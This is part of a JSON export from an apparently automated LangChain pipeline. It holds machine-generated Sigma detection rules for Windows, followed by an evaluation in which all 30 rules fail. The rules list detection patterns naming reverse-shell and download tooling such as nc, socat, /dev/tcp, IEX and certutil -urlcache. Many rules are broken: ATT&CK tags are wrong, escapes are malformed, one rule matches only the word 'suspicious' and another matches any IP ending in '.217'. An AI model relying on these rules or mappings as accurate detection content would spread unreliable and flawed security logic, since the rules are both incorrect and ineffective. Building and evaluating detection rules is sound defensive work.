        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "generation_method": "langchain",
        "id": "7a4e6d28-d883-4650-be56-001e894ddf2c"
      },
      {
        "title": "Exfiltration Over Alternative Protocol",
        "description": "Detects exfiltration of data using alternative protocols",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "ftp",
              "tftp",
              "nc"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "-enc",
              "Out-File",
              "System.Net.WebClient"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-decode",
              "-encode",
              "-urlcache"
            ]
          },
          "selection_bitsadmin": {
            "Image|endswith": "\bitsadmin.exe",
            "CommandLine|contains": [
              "/transfer",
              "http"
            ]
          },
          "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin"
        },
        "falsepositives": [
          "Legitimate use of command line tools for administrative tasks",
          "Use of alternative protocols for legitimate data transfer"
        ],
        "level": "high",
        "tags": [
          "attack.exfiltration",
          "attack.t1567",
          "attack.t1567.002"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over Alternative Protocol",
        "generation_method": "langchain",
        "id": "536d53c8-2cee-485d-ab9a-e534e7bd5852"
      },
      {
        "title": "Data Staging via System Calls",
        "description": "Detects data staging behavior through system calls",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_getadaptersinfo": {
            "Image|endswith": "\\svchost.exe",
            "CommandLine|contains": "GetAdaptersInfo"
          },
          "selection_getlogicaldevicestringsw": {
            "Image|endswith": "\\svchost.exe",
            "CommandLine|contains": "GetLogicalDeviceStringsW"
          },
          "condition": "selection_getadaptersinfo or selection_getlogicaldevicestringsw"
        },
        "falsepositives": [
          "Legitimate system calls by system services",
          "Network configuration tools"
        ],
        "level": "medium",
        "tags": [
          "attack.collection",
          "attack.t1567",
          "attack.data_staging"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data Staging",
        "generation_method": "langchain",
        "id": "2ea3e985-54ef-4321-9f0a-aa979d391d10"
      },
      {
        "title": "Masquerading via Legitimate Process",
        "description": "Detects the use of legitimate processes to execute malicious code",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe"
          },
          "selection_parent_image": {
            "ParentImage|endswith": [
              "\\explorer.exe",
              "\\winlogon.exe",
              "\\services.exe"
            ]
          },
          "selection_suspicious_args": {
            "CommandLine|contains": [
              "/c",
              "/k",
              "&"
            ]
          },
          "condition": "selection_cmd and (selection_parent_image or selection_suspicious_args)"
        },
        "falsepositives": [
          "Legitimate use of cmd.exe by administrators",
          "Scripted tasks using cmd.exe"
        ],
        "level": "medium",
        "tags": [
          "attack.defense_evasion",
          "attack.t1564.003",
          "custom.masquerading",
          "custom.mitre_att&ck"
        ],
        "ttp_id": "unknown",
        "technique_name": "Masquerading",
        "generation_method": "langchain",
        "id": "a7cfe310-67be-4dc3-9220-6427e4e8de3d"
      },
      {
        "title": "Scheduled Task Creation via Windows Task Scheduler",
        "description": "Detects the creation of scheduled tasks via Windows Task Scheduler, which can be used for persistence by malware",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_schtasks": {
            "Image|endswith": "\\schtasks.exe",
            "CommandLine|contains": [
              "/create",
              "/tn"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "New-ScheduledTask",
              "Register-ScheduledTask"
            ]
          },
          "condition": "selection_schtasks or selection_powershell"
        },
        "falsepositives": [
          "Legitimate system administration tasks",
          "Scheduled task creation by system services"
        ],
        "level": "medium",
        "tags": [
          "attack.persistence",
          "attack.t1560",
          "attack.scheduled_task"
        ],
        "ttp_id": "unknown",
        "technique_name": "Scheduled Task",
        "generation_method": "langchain",
        "id": "1029a380-b0b8-4d2f-aa00-929d476f25cc"
      },
      {
        "title": "Command and Control via Hard-Coded C2 Server",
        "description": "Detects connections to hard-coded C2 servers",
        "logsource": {
          "category": "network_connection",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "DestinationIp|endswith": ".217"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "legitimate connections to servers with similar IP addresses"
        ],
        "level": "high",
        "tags": [
          "attack.command_and_control",
          "attack.t1565"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Control",
        "generation_method": "langchain",
        "id": "12f1ff28-59b2-47fa-b715-01207ed3f9f0"
      },
      {
        "title": "Resource Development Activity via Suspicious Process Creation",
        "description": "Detects potential resource development activity by identifying suspicious process creation patterns associated with downloading, executing, or registering payloads. Focuses on use of system utilities in ways commonly seen during adversary infrastructure setup.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_rundll32": {
            "Image|endswith": "\\rundll32.exe",
            "CommandLine|contains": [
              "\\\\",
              "http",
              "bitsadmin",
              "certutil",
              "Invoke-WebRequest"
            ]
          },
          "selection_regsvr32": {
            "Image|endswith": "\\regsvr32.exe",
            "CommandLine|contains": [
              "scrobj",
              "http",
              "bitsadmin",
              "certutil"
            ]
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": [
              "http",
              "/transfer"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-urlcache",
              "-decode",
              "-verifyctl"
            ]
          },
          "selection_mshta": {
            "Image|endswith": "\\mshta.exe",
            "CommandLine|contains": [
              "http",
              "\\\\"
            ]
          },
          "selection_cscript_wscript": {
            "Image|endswith": [
              "\\cscript.exe",
              "\\wscript.exe"
            ],
            "CommandLine|contains": [
              "http",
              "\\\\"
            ]
          },
          "selection_powershell_download": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "DownloadFile",
              "IEX",
              "-enc"
            ]
          },
          "condition": "selection_rundll32 or selection_regsvr32 or selection_bitsadmin or selection_certutil or selection_mshta or selection_cscript_wscript or selection_powershell_download"
        },
        "falsepositives": [
          "Administrative scripts using certutil or bitsadmin for legitimate software deployment",
          "Automated patch management tools downloading updates via command-line utilities",
          "Enterprise monitoring agents using script-based health checks",
          "PowerShell scripts using Invoke-WebRequest for API calls in automation workflows"
        ],
        "level": "high",
        "tags": [
          "attack.t1583",
          "attack.t1584",
          "attack.t1585",
          "attack.t1586",
          "attack.t1587",
          "attack.t1588",
          "attack.t1601",
          "attack.t1602",
          "attack.t1566",
          "attack.t1204",
          "attack.execution",
          "attack.resource-development"
        ],
        "ttp_id": "unknown",
        "technique_name": "Resource Development",
        "generation_method": "langchain",
        "id": "1a1b803f-1d3d-40b5-a17c-df120be80cf3"
      },
      {
        "title": "Reverse Shell Creation via Command Line",
        "description": "Detects the creation of a reverse shell by identifying suspicious command-line patterns commonly used to establish outbound connections to a C2 server. Focuses on known reverse shell techniques using common tools like cmd.exe, powershell.exe, and netcat-like utilities.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd_reverse": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "start",
              "nc",
              "ncat",
              "powershell",
              "bash",
              "sh",
              "telnet",
              "socat"
            ]
          },
          "selection_powershell_reverse": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-NoP",
              "-Exec",
              "Bypass",
              "-Enc",
              "IEX",
              "Invoke-Expression",
              "Net.Sockets.TcpClient",
              "System.Net.Sockets"
            ]
          },
          "selection_nc_netcat": {
            "CommandLine|contains": [
              "-e",
              "/bin/bash",
              "/bin/sh",
              "/c",
              "cmd"
            ],
            "CommandLine|contains|all": [
              "-e",
              " "
            ]
          },
          "selection_bash_sh": {
            "Image|endswith": [
              "\\bash",
              "\\sh"
            ],
            "CommandLine|contains": [
              "/dev/tcp",
              "exec",
              "socket",
              "nc",
              "ncat",
              "socat"
            ]
          },
          "condition": "selection_cmd_reverse or selection_powershell_reverse or selection_nc_netcat or selection_bash_sh"
        },
        "falsepositives": [
          "Legitimate system administration using remote shells or scripting tools",
          "Automated\u8fd0\u7ef4 scripts that use command-line utilities for remote management",
          "Penetration testing activities conducted by authorized teams"
        ],
        "level": "high",
        "tags": [
          "attack.t1059",
          "attack.t1505.003",
          "attack.t1071.004",
          "detection.rule.reverse_shell",
          "custom.windows",
          "custom.command_and_control"
        ],
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "generation_method": "langchain",
        "id": "3b9ca2ea-ffd6-4211-a9ac-01f12c0d6fcc"
      },
      {
        "title": "Data Encoding for Exfiltration via Command-Line Tools",
        "description": "Detects the use of encoding tools and techniques commonly used to encode data prior to exfiltration, focusing on command-line utilities such as certutil, PowerShell, and base64 encoding patterns.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-encode",
              "-decode"
            ]
          },
          "selection_powershell_encoded": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "-EncodedCommand",
              "[Convert]::ToBase64String",
              "Base64"
            ]
          },
          "selection_cmd_base64": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "base64"
            ]
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": [
              "base64"
            ]
          },
          "selection_bash": {
            "Image|endswith": "\\bash.exe",
            "CommandLine|contains": [
              "base64"
            ]
          },
          "selection_python": {
            "Image|endswith": [
              "\\python.exe",
              "\\python3.exe"
            ],
            "CommandLine|contains": [
              "base64",
              "b64encode",
              "b64decode"
            ]
          },
          "condition": "selection_certutil or selection_powershell_encoded or selection_cmd_base64 or selection_wmic or selection_bash or selection_python"
        },
        "falsepositives": [
          "Legitimate administrative use of certutil for certificate management",
          "Scripts using base64 encoding for configuration or data serialization in development or automation",
          "PowerShell scripts using -EncodedCommand for legitimate remote execution or task automation"
        ],
        "level": "high",
        "tags": [
          "attack.t1132",
          "attack.t1071",
          "attack.t1010",
          "attack.t1059",
          "attack.c2",
          "detection.encoding",
          "custom.exfiltration"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data Encoding",
        "generation_method": "langchain",
        "id": "61aff9e2-bc89-4104-8d7f-55be61258746"
      },
      {
        "title": "Process Discovery via Command Line Tools",
        "description": "Detects process discovery activities on Windows systems using command line tools. Adversaries may use built-in command-line interfaces to gather information about running processes for situational awareness or to assist in execution, persistence, or lateral movement.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_tasklist": {
            "Image|endswith": "\\tasklist.exe"
          },
          "selection_wmic_process": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": "process"
          },
          "selection_ps_getprocess": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Get-Process",
              "ps",
              "tasklist",
              "gwmi Win32_Process"
            ]
          },
          "selection_systeminfo": {
            "Image|endswith": "\\systeminfo.exe"
          },
          "selection_netstat": {
            "Image|endswith": "\\netstat.exe",
            "CommandLine|contains": [
              "-ano",
              "/ano"
            ]
          },
          "condition": "selection_tasklist or selection_wmic_process or selection_ps_getprocess or selection_systeminfo or selection_netstat"
        },
        "falsepositives": [
          "Legitimate administrative activity using tasklist, wmic, systeminfo, netstat, or PowerShell Get-Process",
          "Scheduled tasks or monitoring scripts that enumerate running processes",
          "Endpoint detection and response (EDR) tools querying system process state"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1057",
          "attack.t1087",
          "attack.t1063",
          "attack.t1018",
          "detection.emulation",
          "windows.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Discovery",
        "generation_method": "langchain",
        "id": "ed88ae9f-ab61-4f41-81ea-d90649f8081a"
      },
      {
        "title": "Detected Process Injection Activity via Suspicious Process Creation and Command Line Patterns",
        "description": "Detects potential process injection activity by identifying suspicious parent-child process relationships and command line arguments commonly associated with code injection techniques, such as reflective loading or DLL injection using Windows native tools.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_suspicious_parent": {
            "ParentImage|endswith": [
              "\\lsass.exe",
              "\\svchost.exe",
              "\\winlogon.exe",
              "\\csrss.exe",
              "\\services.exe"
            ],
            "Image|endswith": [
              "\rundll32.exe",
              "\regsvr32.exe",
              "\\mshta.exe",
              "\\certutil.exe",
              "\\cmstp.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ]
          },
          "selection_injection_patterns": {
            "CommandLine|contains": [
              "-enc",
              "Base64",
              "Reflective",
              "AmsiUtils",
              "/i",
              "CallRemoteFunction",
              "LoadLibrary",
              "WriteProcessMemory",
              "CreateRemoteThread",
              "VirtualAllocEx"
            ]
          },
          "selection_suspicious_child": {
            "ParentImage|endswith": [
              "\\explorer.exe",
              "\taskhostw.exe",
              "\\dllhost.exe"
            ],
            "Image|endswith": [
              "\\powershell.exe",
              "\\cmd.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ],
            "CommandLine|contains": [
              "\\\\",
              "http",
              "iex",
              "Invoke-Expression",
              "Net.WebClient",
              "DownloadString",
              "Shellcode"
            ]
          },
          "condition": "selection_suspicious_parent or selection_injection_patterns or selection_suspicious_child"
        },
        "falsepositives": [
          "Legitimate administrative scripts using rundll32 or regsvr32 for COM registration",
          "Software deployment tools executing commands via trusted Windows utilities",
          "Internal monitoring agents spawning child processes from system services"
        ],
        "level": "high",
        "tags": [
          "attack.defense-evasion",
          "attack.t1055",
          "detection.rule.sigma",
          "windows.security",
          "process.injection"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "generation_method": "langchain",
        "id": "e6532b59-0483-4551-8d72-b2a808e1165a"
      },
      {
        "title": "Application Layer Protocol Activity via Command Line Tools",
        "description": "Detects potential command and control activity using application layer protocols by identifying suspicious command-line patterns associated with data exfiltration or C2 communication",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "start",
              "echo",
              ">",
              ">>"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "-enc",
              "Out-File",
              "System.Net.WebClient",
              "Invoke-RestMethod",
              "-o",
              "-OutFile"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-decode",
              "-encode",
              "-urlcache",
              "-f"
            ]
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": [
              "/transfer",
              "http",
              "https"
            ]
          },
          "selection_curl_wget": {
            "Image|endswith": [
              "\\curl.exe",
              "\\wget.exe"
            ],
            "CommandLine|contains": [
              "http",
              "https",
              "-O",
              "--output"
            ]
          },
          "condition": "selection_cmd or selection_powershell or selection_certutil or selection_bitsadmin or selection_curl_wget"
        },
        "falsepositives": [
          "Legitimate administrative scripts using command-line tools for file download or transfer",
          "Software deployment or patch management using BITSAdmin or certutil",
          "PowerShell scripts using web requests for API calls in monitoring tools"
        ],
        "level": "high",
        "tags": [
          "attack.t1071",
          "attack.command-and-control",
          "detection.signature",
          "custom.windows",
          "custom.exfiltration"
        ],
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "generation_method": "langchain",
        "id": "c5c16565-c303-4c95-ae00-c232294c1ae9"
      },
      {
        "title": "Command and Scripting Interpreter via cmd.exe",
        "description": "Detects execution of cmd.exe which may indicate use of command and scripting interpreter for execution. Focuses on common command-line patterns associated with malicious activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe"
          },
          "selection_cli_args": {
            "CommandLine|contains": [
              "/c",
              "/k",
              "start",
              "echo",
              ">",
              ">>",
              "<",
              "|",
              "&",
              "&&",
              "||"
            ]
          },
          "condition": "selection_cmd and selection_cli_args"
        },
        "falsepositives": [
          "Legitimate administrative scripts or batch files executing via cmd.exe",
          "Software installers that invoke command-line utilities",
          "User-initiated command-line operations for troubleshooting"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.T1059",
          "custom.windows",
          "custom.cmd",
          "custom.command_interpreter"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "784b16d8-4a76-41c8-8f64-470e4781a270"
      },
      {
        "title": "Command and Scripting Interpreter Activity via Behavioral Patterns",
        "description": "Detected Command and Scripting Interpreter activity using behavioral command-line patterns commonly associated with execution. Covers multiple interpreter types including PowerShell, cmd, and scripting tools with specific command-line indicators.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell_encoded": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "-encodedcommand",
              "-e ",
              "-exec bypass",
              "IEX",
              "Invoke-Expression",
              "DownloadString",
              "WebClient",
              "-WindowStyle hidden",
              "-NoProfile",
              "-NonInteractive"
            ]
          },
          "selection_cmd_patterns": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "start",
              "echo",
              ">",
              ">>",
              "certutil",
              "bitsadmin",
              "nslookup",
              "ping",
              "whoami",
              "net user",
              "net localgroup",
              "reg query",
              "wmic",
              "for /f",
              "set "
            ]
          },
          "selection_wscript_cscript": {
            "Image|endswith": [
              "\\wscript.exe",
              "\\cscript.exe"
            ],
            "CommandLine|contains": [
              ".vbs",
              ".js",
              ".jse",
              ".vbe",
              ".wsf"
            ]
          },
          "selection_bash_sh": {
            "Image|endswith": [
              "\\bash",
              "sh"
            ],
            "CommandLine|contains": [
              "/dev/tcp",
              "nc ",
              "netcat",
              "curl ",
              "wget ",
              "python -c",
              "php -r"
            ]
          },
          "selection_python_inline": {
            "Image|endswith": [
              "\\python.exe",
              "\\python3.exe",
              "\\py.exe"
            ],
            "CommandLine|contains": [
              "-c ",
              "import os",
              "import subprocess",
              "exec(",
              "eval("
            ]
          },
          "condition": "selection_powershell_encoded or selection_cmd_patterns or selection_wscript_cscript or selection_bash_sh or selection_python_inline"
        },
        "falsepositives": [
          "Legitimate administrative scripting using PowerShell, cmd, or scripting engines",
          "Software deployment and patch management tools",
          "Scheduled tasks running maintenance scripts",
          "Developer use of command-line interpreters",
          "PowerShell Desired State Configuration (DSC) execution"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1059",
          "custom.detection-behavioral-anomalies",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "97265f44-12ad-4d5d-995f-488db57de516"
      },
      {
        "title": "Detected Obfuscated Files or Information via Command-Line Obfuscation",
        "description": "Detects use of obfuscated command-line arguments indicative of defense evasion through obfuscation techniques, commonly seen in malicious scripts or payloads. Detection based on patterns such as encoded commands, excessive use of quotes, concatenation, and environment variable substitution.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell_encoded": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "-e",
              "-encodedcommand"
            ]
          },
          "selection_cmd_obfuscation": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "%",
              "^",
              "\"\"",
              "&",
              "call",
              "set"
            ]
          },
          "selection_script_host": {
            "Image|endswith": [
              "\\wscript.exe",
              "\\cscript.exe"
            ],
            "CommandLine|contains": [
              "\\",
              "\\.js",
              "\\.vbs",
              "eval",
              "unescape"
            ]
          },
          "selection_bash_shells": {
            "Image|endswith": [
              "\\bash",
              "\\sh"
            ],
            "CommandLine|contains": [
              "-c",
              "eval",
              "base64"
            ]
          },
          "selection_general_obfuscation": {
            "CommandLine|contains": [
              "${",
              "$(",
              "`",
              "\\x",
              "\\u",
              "\"+\""
            ]
          },
          "condition": "selection_powershell_encoded or selection_cmd_obfuscation or selection_script_host or selection_bash_shells or selection_general_obfuscation"
        },
        "falsepositives": [
          "Legitimate administrative scripts using encoded PowerShell commands",
          "Build or deployment automation tools invoking obfuscated commands",
          "Software installers using embedded scripts with environment variables",
          "Developer tools executing dynamically generated command lines"
        ],
        "level": "high",
        "tags": [
          "attack.defense-evasion",
          "attack.T1027",
          "detection.signature",
          "execution.command-line",
          "custom.obfuscation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "generation_method": "langchain",
        "id": "a14fd223-3402-45db-9191-99d672405de1"
      },
      {
        "title": "Exfiltration Over C2 Channel via Common Tools and Techniques",
        "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching and behavioral indicators involving common command-line tools used for data exfiltration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell_web": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Invoke-WebRequest",
              "Invoke-RestMethod",
              "-Uri",
              "-OutFile",
              "System.Net.WebClient",
              "DownloadFile",
              "UploadString",
              "-EncodedCommand"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-encode",
              "-decode",
              "-urlcache",
              "-f"
            ]
          },
          "selection_bitsadmin": {
            "Image|endswith": "\\bitsadmin.exe",
            "CommandLine|contains": [
              "/transfer",
              "http",
              "https",
              "/priority",
              "NORMAL"
            ]
          },
          "selection_cmd_redir": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "start",
              "echo",
              ">",
              ">>",
              "copy",
              "type",
              "net use"
            ]
          },
          "selection_compress": {
            "CommandLine|contains": [
              "Compress-Archive",
              "7z a",
              "zip",
              "tar -czf"
            ],
            "Image|endswith": [
              "\\powershell.exe",
              "\\wscript.exe",
              "\\cscript.exe"
            ]
          },
          "selection_ftp_tftp": {
            "Image|endswith": [
              "\\ftp.exe",
              "\\tftp.exe"
            ],
            "CommandLine|contains": [
              "put",
              "get",
              "open"
            ]
          },
          "condition": "selection_powershell_web or selection_certutil or selection_bitsadmin or selection_cmd_redir or selection_compress or selection_ftp_tftp"
        },
        "falsepositives": [
          "Legitimate administrative use of certutil, bitsadmin, or PowerShell for software installation or updates",
          "Scheduled tasks using command-line tools for backup or file transfer",
          "Automated scripts performing authorized data transfers",
          "Development or testing activities involving local web requests or encoding"
        ],
        "level": "high",
        "tags": [
          "attack.exfiltration",
          "attack.T1041",
          "detection.emerging",
          "use-case.exfiltration",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "generation_method": "langchain",
        "id": "3c61cd6d-1154-4718-accc-89e3195a1288"
      },
      {
        "title": "Archive Collected Data via Common Archiving Tools and Techniques",
        "description": "Detects archiving of collected data using common tools and command-line utilities such as PowerShell Compress-Archive, 7-Zip, WinRAR, and other archive utilities often used in data staging prior to exfiltration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "Compress-Archive",
              "7z a",
              "rar a",
              "tar -cf",
              "zip -r"
            ]
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "7z a",
              "rar a",
              "tar -cf",
              "zip -r",
              "makecab"
            ]
          },
          "selection_7zip": {
            "Image|endswith": "\\7z.exe",
            "CommandLine|contains": "a"
          },
          "selection_rar": {
            "Image|endswith": "\\rar.exe",
            "CommandLine|contains": "a"
          },
          "selection_tar": {
            "Image|endswith": "\\tar.exe",
            "CommandLine|contains": "-cf"
          },
          "selection_zip": {
            "Image|endswith": "\\zip.exe",
            "CommandLine|contains": "-r"
          },
          "selection_makecab": {
            "Image|endswith": "\\makecab.exe",
            "CommandLine|contains": [
              "/f",
              "/d Compress"
            ]
          },
          "condition": "selection_powershell or selection_cmd or selection_7zip or selection_rar or selection_tar or selection_zip or selection_makecab"
        },
        "falsepositives": [
          "Legitimate administrative use of archiving tools for backup or packaging",
          "Automated software deployment scripts using compression",
          "User-initiated file compression via command line or scripts"
        ],
        "level": "high",
        "tags": [
          "attack.collection",
          "attack.T1560",
          "detection.emerging",
          "use-case.data_staging"
        ],
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "generation_method": "langchain",
        "id": "2f95eda2-56e8-4bfe-9ad8-59c4e8427e17"
      },
      {
        "title": "User Execution of Malicious File via Suspicious Process Creation",
        "description": "Detects user execution of malicious files by identifying suspicious process creation patterns commonly associated with initial execution from phishing or malicious documents. Focuses on Office applications spawning command-line tools or scripts, which is uncommon in normal user activity.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative scripts initiated by users after opening Office documents (rare)",
          "Enterprise software installers launched from document templates (uncommon)",
          "User training or red team exercises"
        ],
        "level": "high",
        "tags": [
          "attack.execution",
          "attack.t1204.002",
          "attack.t1059",
          "attack.t1204",
          "detection.rule.suspicious_process_chain"
        ],
        "ttp_id": "unknown",
        "technique_name": "User Execution: Malicious File",
        "generation_method": "langchain",
        "id": "ef8c18c5-c12f-48fe-bf5c-ce78964627d0"
      }
    ]
  },
  "evaluation": {
    "status": "success",
    "summary": {
      "rules_evaluated": 30,
      "average_quality_score": 0.53,
      "passing_rules": 0,
      "failing_rules": 30,
      "langchain_evaluations": 60,
      "fallback_evaluations": 0,
      "errors": 0,
      "processing_time_ms": 25325.254
    },
    "evaluation_results": [
      {
        "rule_title": "Remote Template Injection via Office Documents",
        "rule_id": "eb97eb4a-1bbb-45d7-96bd-b88aef560f4f",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (Remote Template Injection) and has a clear description",
          "It uses a specific log source (Sysmon) and has a well-defined detection condition"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world scenario, which raises concerns about its effectiveness",
          "It contains a generic 'unknown' TTP ID and lacks a specified tactic",
          "The rule may produce false positives due to legitimate Office document editing and PowerShell or command prompt usage for administrative tasks"
        ],
        "suggestions": [
          "Verify the rule in a real-world scenario to assess its detection coverage and false positive rate",
          "Update the TTP ID and tactic to provide more context and accuracy",
          "Consider adding more specific conditions to reduce false positives, such as filtering out known legitimate processes or adding additional detection logic"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Command and Scripting Interpreter",
        "rule_id": "73fe830d-54bd-4784-a370-d3c166299243",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific technique (Command and Scripting Interpreter) which is a common TTP",
          "It uses a clear and concise condition for detection"
        ],
        "weaknesses": [
          "The rule has not been verified in a real-world scenario, which raises concerns about its effectiveness",
          "It may produce false positives due to legitimate use of the targeted commands and scripts",
          "The rule does not contain any specific IPs or domains, but it lacks context about the TTP"
        ],
        "suggestions": [
          "Verify the rule in a real-world scenario to assess its detection coverage and false positive rate",
          "Add more context to the rule, such as specific command line arguments or user accounts, to reduce false positives",
          "Consider adding more conditions to the rule to make it more specific and reduce noise"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Phishing Detection via Office Process Spawning Command Shells",
        "rule_id": "f1f8f8f5-fb91-4e48-8c59-40caffbeb91a",
        "quality_score": 0.5599999999999999,
        "status": "fail",
        "strengths": [
          "The rule targets a specific and relevant technique (Phishing) with a clear description",
          "It uses a specific log source (Sysmon) and focuses on a particular type of event (process creation)",
          "The rule includes potential false positives and tags for context"
        ],
        "weaknesses": [
          "The rule lacks real-world verification, making its effectiveness uncertain",
          "It does not specify a tactic in the Target TTP, which could provide more context",
          "The rule does not contain any IPs or domains, but this is not necessarily a weakness in this case"
        ],
        "suggestions": [
          "Perform real-world verification to assess the rule's detection coverage and false positive rate accurately",
          "Consider adding more specific conditions to reduce false positives (e.g., command line arguments or user context)",
          "Include a tactic in the Target TTP to provide more context about the technique being targeted"
        ],
        "metrics": {
          "accuracy": 0.5,
          "completeness": 0.9,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Obfuscated Files or Information Detection",
        "rule_id": "4d8123db-00a6-4001-99e9-e161b3c92c9a",
        "quality_score": 0.32,
        "status": "fail",
        "strengths": [
          "The rule attempts to detect obfuscated files or information by looking for specific API calls and custom encoding",
          "It provides a clear description of the detection logic"
        ],
        "weaknesses": [
          "The rule contains hardcoded values (e.g., C:\\Users\\user\\AppData\\Local\\Temp\\[redacted].zip) that may not be relevant in all environments",
          "It does not account for potential false positives, such as legitimate use of powershell for system administration",
          "The rule failed to detect the attack in the real SIEM, resulting in a low detection coverage score",
